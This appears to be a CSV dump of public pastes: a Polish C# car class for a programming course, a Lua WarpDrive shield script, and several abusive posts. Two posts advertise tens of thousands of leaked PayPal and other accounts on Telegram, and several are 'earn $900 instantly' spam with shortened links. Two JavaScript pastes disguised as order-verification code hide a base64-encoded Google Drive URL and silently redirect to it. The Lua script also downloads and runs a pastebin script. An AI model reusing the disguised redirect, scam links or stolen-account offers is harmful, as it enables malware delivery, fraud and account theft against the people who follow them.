id,title,username,language,date,content
ZRbDsGkc,klasaAuto,cuniszkiewicz,C#,Saturday 26th of April 2025 01:03:01 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace OOP_1N122L_IS_SK_lato_2025
{
    interface IAuto
    {
        int PredkoscMaksymalna {get; set;}
        void Opis();
        double PoliczCzasPrzejazdu(int k);
    }

    public class Auto : IAuto
    {
        //pola
        public string marka;
        public string model;
        protected int predkoscMaksymalna;
        public double pojemnoscSilnika;


        //metody
        public virtual void Opis()
        {
            Console.WriteLine($""Auto: {marka} {model}, "" +
                    $""prędkość maksymalna: {predkoscMaksymalna}km/h,"" +
                    $""pojemność skokowa silnika to {pojemnoscSilnika}ccm"");

        }


        public double PoliczCzasPrzejazdu(int kilometry)
        {
            double czas = 0;

            if (predkoscMaksymalna > 0)
                czas = (double)kilometry / predkoscMaksymalna;

            return czas;
        }

        //konstruktory

        public Auto()
        {
            marka = ""Fiat"";
            model = ""Punto"";
            predkoscMaksymalna = 180;
            pojemnoscSilnika = 1199;
        }

        public Auto(string _marka, string _model, int _predkoscMaksymalna = 180, double _pojemnoscSilnika = 1199)
        {
            marka = _marka;
            model = _model;
            predkoscMaksymalna = _predkoscMaksymalna;
            pojemnoscSilnika = _pojemnoscSilnika;
        }

        public Auto(Auto autoWzorcowe)
        {
            marka = autoWzorcowe.marka;
            model = autoWzorcowe.model;
            predkoscMaksymalna = autoWzorcowe.predkoscMaksymalna;
            pojemnoscSilnika = autoWzorcowe.pojemnoscSilnika;
        }

        //metody ustawiające

        public void UstawPredkoscMaksymalna(int _predkosc)
        {
            if (_predkosc >= 20)
                predkoscMaksymalna = _predkosc;
            else
                predkoscMaksymalna = 20;
        }

        public int WezPredkoscMaksymalna()
        {
            return predkoscMaksymalna;
        }

        //Właściwości
        public int PredkoscMaksymalna
        {
            get { return predkoscMaksymalna; }
            set
            {
                if (value >= 20 && value < 400)
                    predkoscMaksymalna = value;
                else
                    predkoscMaksymalna = 20;
            }
        }

        private double temperaturaOleju;

        public double TemperaturaOlejuC
        {
            get { return temperaturaOleju; }
            set
            {
                if (value > 0 && value < 140)
                    temperaturaOleju = value;
                else
                    temperaturaOleju = 90;
            }
        }
        public double TemperaturaOlejuK
        {
            get { return temperaturaOleju + 273.15; }
            set
            {
                if (value > 273.15 && value < 413.15)
                    temperaturaOleju = value - 273.15;
                else
                    temperaturaOleju = 90;
            }
        }
    }
}
"
d3wnxZ2E,PayPal with Balance,zebmekey,JavaScript,Saturday 26th of April 2025 01:02:54 AM CDT,48160 Accounts Posted On https://t.me/leakedbyem1nem
BVLhLbYj,Make $1000 15-MINUTES (BEGINNER) 96,HUBBITO,JavaScript,Saturday 26th of April 2025 01:02:15 AM CDT," 
Pdf https://tinyurl.com/privguidee

qQB8moNUw1
"
ytEkU19L,EARN $900 INSTANTLY 2025⭐ NU,HUBBITO,JavaScript,Saturday 26th of April 2025 12:52:58 AM CDT," 
Pdf https://tinyurl.com/privguidee

Iv1UtzJG5V
"
LcSgDCY6,Untitled,SpawnKz,JavaScript,Saturday 26th of April 2025 12:50:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18615/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Qnywipfq,Leaked Accounts - Fresh Hits,zebmekey,JavaScript,Saturday 26th of April 2025 12:47:24 AM CDT,92899 Accounts Posted On https://t.me/leakedbyem1nem
EEmJxeax,Make $1000 15-MINUTES  (BEGINNER) ME,HUBBITO,JavaScript,Saturday 26th of April 2025 12:43:39 AM CDT," 
Pdf https://tinyurl.com/privguidee

X3g1968EIC
"
RSZCsPJn,Products.js,SpawnKz,JavaScript,Saturday 26th of April 2025 12:34:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76841/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
j9XtEEWF,EARN $900 INSTANTLY 2025 M6,SueArce,JavaScript,Saturday 26th of April 2025 12:34:14 AM CDT," 
Pdf https://tinyurl.com/privguidee

ZCUUsRJaCw
"
3i7qHRm0,4-25-25水平采矿,jaklsfjlsak,Lua,Saturday 26th of April 2025 12:33:52 AM CDT,"local OffsetValue = 3
local shield = peripheral.find(""warpdriveForceFieldProjector"")
local lasers = peripheral.getNames()
local speaker = peripheral.find(""warpdriveSpeaker"")
local lever = ""front""
local safedist = 15
local lastLx, lastLy, lastLz = 0, 0, 0

-- Helper: only speak if a speaker is present
local function trySpeak(msg)
    if speaker then speaker.speak(msg) end
end

function shieldOffset(lx, ly, lz, fx, fy, fz)
    local dx = lx - fx
    local dy = ly - fy
    local dz = lz - fz
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    dx = dx / distance
    dy = dy / distance
    dz = dz / distance
    local t1x = lx + dx * OffsetValue
    local t1y = ly + dy * OffsetValue
    local t1z = lz + dz * OffsetValue
    return t1x, t1y, t1z, distance
end

if not fs.exists(""conf"") then
    shell.run(""pastebin get 38M5cNbZ conf"")
    term.clear()
end

for i = #lasers, 1, -1 do
    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
        table.remove(lasers, i)
    else
        peripheral.wrap(lasers[i]).beamFrequency(1420)
    end
end

print(""Control System Online, Toggle Redstone To Toggle Shields, Press C to Configure"")
trySpeak(""Control System Online"")

local _, upgrades = shield.getUpgrades()
local Size
if upgrades:match(""1/4 x Range"") then
    Size = 16
elseif upgrades:match(""2/4 x Range"") then
    Size = 32
elseif upgrades:match(""3/4 x Range"") then
    Size = 48
elseif upgrades:match(""4/4 x Range"") then
    Size = 64
elseif upgrades:match(""0/4 x Range"") then
    Size = 0
end

while true do
    local event, laserName, lx, ly, lz = os.pullEvent()
    if event == ""laserScanning"" then
        lastLx, lastLy, lastLz = tonumber(lx), tonumber(ly), tonumber(lz)
        local fx, fy, fz = shield.getLocalPosition()
        local t1x, t1y, t1z, distance = shieldOffset(lastLx, lastLy, lastLz, fx, fy, fz)

        local tx = (t1x - fx) / Size
        local ty = (t1y - fy) / Size
        local tz = (t1z - fz) / Size

        -- round once for speaking
        local rd = math.floor(distance + 0.5)
        local rt1x = math.floor(t1x + 0.5)
        local rt1y = math.floor(t1y + 0.5)
        local rt1z = math.floor(t1z + 0.5)

        if distance < safedist then
            print(""Target is too Close! Shield Disabled!"")
            trySpeak(""Target is too Close! Shield Disabled!"")
            shield.enable(false)
            trySpeak(""Target Dis: "" .. rd)
            trySpeak(""Offset Coordinates: x="" .. rt1x .. "", y="" .. rt1y .. "", z="" .. rt1z)
            trySpeak(""Laser Coordinates: x="" .. lastLx .. "", y="" .. lastLy .. "", z="" .. lastLz)
        else
            shield.translation(tx, ty, tz)
            trySpeak(""Target Dis: "" .. rd)
            trySpeak(""Offset Coordinates: x="" .. rt1x .. "", y="" .. rt1y .. "", z="" .. rt1z)
            trySpeak(""Laser Coordinates: x="" .. lastLx .. "", y="" .. lastLy .. "", z="" .. lastLz)
        end

    elseif event == ""redstone"" then
        local fx, fy, fz = shield.getLocalPosition()
        local _, _, _, distance = shieldOffset(lastLx, lastLy, lastLz, fx, fy, fz)
        local on = redstone.getAnalogInput(lever)
        if on > 6 and distance > safedist then
            shield.enable(true)
        elseif on > 6 and distance < safedist then
            print(""Target is too Close! Shield Disabled!"")
            trySpeak(""Target is too Close! Shield Disabled!"")
            shield.enable(false)
        else
            shield.enable(false)
        end

    elseif event == ""key"" and laserName == 46 then
        print(""C key pressed, running 'conf' script..."")
        shell.run(""conf"")
    end
end
"
